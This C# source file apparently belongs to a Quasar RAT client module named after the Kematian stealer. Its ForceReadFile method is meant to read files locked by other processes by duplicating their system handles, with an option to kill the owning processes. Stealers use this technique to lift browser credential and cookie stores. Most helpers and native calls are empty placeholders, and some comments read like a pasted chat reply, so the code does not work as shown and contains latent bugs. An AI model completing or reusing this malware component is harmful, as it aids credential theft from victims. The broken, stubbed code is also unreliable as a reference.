﻿using System;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;

namespace Quasar.Client.Kematian.HelpingMethods
{
    public class ReadFile
    {
        public static byte[] ForceReadFile(string filePath, bool killOwningProcessIfCouldntAcquire = false)
        {
            try
            {
                return File.ReadAllBytes(filePath);
            }
            catch (Exception e)
            {
                if (e.HResult != -2147024864) // File in use error
                {
                    return null;
                }
            }

            bool pidless = false;

            if (!GetProcessLockingFile(filePath, out int[] processes))
            {
                pidless = true;
            }

            uint dwSize = 0;
            uint status = 0;
            uint STATUS_INFO_LENGTH_MISMATCH = 0xC0000004;

            int handleStructSize = Marshal.SizeOf(typeof(InternalStructs.SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX));
            IntPtr pInfo = Marshal.AllocHGlobal(handleStructSize);

            do
            {
                status = NativeMethods.NtQuerySystemInformation(
                    SYSTEM_INFORMATION_CLASS.SystemExtendedHandleInformation,
                    pInfo,
                    dwSize,
                    out dwSize);

                if (status == STATUS_INFO_LENGTH_MISMATCH)
                {
                    pInfo = Marshal.ReAllocHGlobal(pInfo, (IntPtr)dwSize);
                }
            } while (status != 0);

            IntPtr pInfoBackup = pInfo;
            ulong numOfHandles = (ulong)Marshal.ReadIntPtr(pInfo);
            pInfo += 2 * IntPtr.Size;

            byte[] result = null;

            for (ulong i = 0; i < numOfHandles; i++)
            {
                InternalStructs.SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX handleInfo =
                    Marshal.PtrToStructure<InternalStructs.SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX>(
                        pInfo + (int)(i * (uint)handleStructSize));

                if (!pidless && !processes.Contains((int)(uint)handleInfo.UniqueProcessId))
                {
                    continue;
                }

                if (DupHandle((int)handleInfo.UniqueProcessId, (IntPtr)(ulong)handleInfo.HandleValue, out IntPtr duplicatedHandle))
                {
                    if (NativeMethods.GetFileType(duplicatedHandle) != FileType.FILE_TYPE_DISK)
                    {
                        NativeMethods.CloseHandle(duplicatedHandle);
                        continue;
                    }

                    string name = GetPathFromHandle(duplicatedHandle);

                    if (name == null)
                    {
                        NativeMethods.CloseHandle(duplicatedHandle);
                        continue;
                    }

                    if (name.StartsWith("\\\\?\\"))
                    {
                        name = name.Substring(4);
                    }

                    if (name == filePath)
                    {
                        result = ReadFileBytesFromHandle(duplicatedHandle);
                        NativeMethods.CloseHandle(duplicatedHandle);
                        if (result != null)
                        {
                            break;
                        }
                    }

                    NativeMethods.CloseHandle(duplicatedHandle);
                }
            }

            Marshal.FreeHGlobal(pInfoBackup);

            if (result == null && killOwningProcessIfCouldntAcquire)
            {
                foreach (int processId in processes)
                {
                    KillProcess(processId);
                }

                try
                {
                    result = File.ReadAllBytes(filePath);
                }
                catch
                {
                }
            }

            return result;
        }

        // Placeholder methods for missing dependencies in your code
        private static bool GetProcessLockingFile(string filePath, out int[] processes)
        {
            processes = null;
            // Implementation from previous discussions
            return false;
        }

        private static bool DupHandle(int processId, IntPtr sourceHandle, out IntPtr duplicatedHandle)
        {
            duplicatedHandle = IntPtr.Zero;
            // Implement duplicate handle logic here
            return false;
        }

        private static string GetPathFromHandle(IntPtr handle)
        {
            // Implement logic to retrieve the path from a handle
            return null;
        }

        private static byte[] ReadFileBytesFromHandle(IntPtr handle)
        {
            // Implement logic to read file bytes from a handle
            return null;
        }

        private static void KillProcess(int processId)
        {
            // Implement logic to kill a process by its ID
        }
    }

    // Placeholder struct and enum definitions
    public static class InternalStructs
    {
        public struct SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX
        {
            public IntPtr UniqueProcessId;
            public IntPtr HandleValue;
            // Other members as needed
        }
    }

    public static class NativeMethods
    {
        public static uint NtQuerySystemInformation(
            int systemInformationClass,
            IntPtr systemInformation,
            uint systemInformationLength,
            out uint returnLength)
        {
            returnLength = 0;
            // Implement P/Invoke call to NtQuerySystemInformation
            return 0;
        }

        public static uint GetFileType(IntPtr hFile)
        {
            // Implement P/Invoke call to GetFileType
            return 0;
        }

        public static bool CloseHandle(IntPtr hObject)
        {
            // Implement P/Invoke call to CloseHandle
            return false;
        }
    }

    public class SYSTEM_INFORMATION_CLASS
    {
        public const int SystemExtendedHandleInformation = 64; // Example value, verify with actual documentation
    }

    public class FileType
    {
        public const uint FILE_TYPE_DISK = 1; // Example value, verify with actual documentation
    }
}
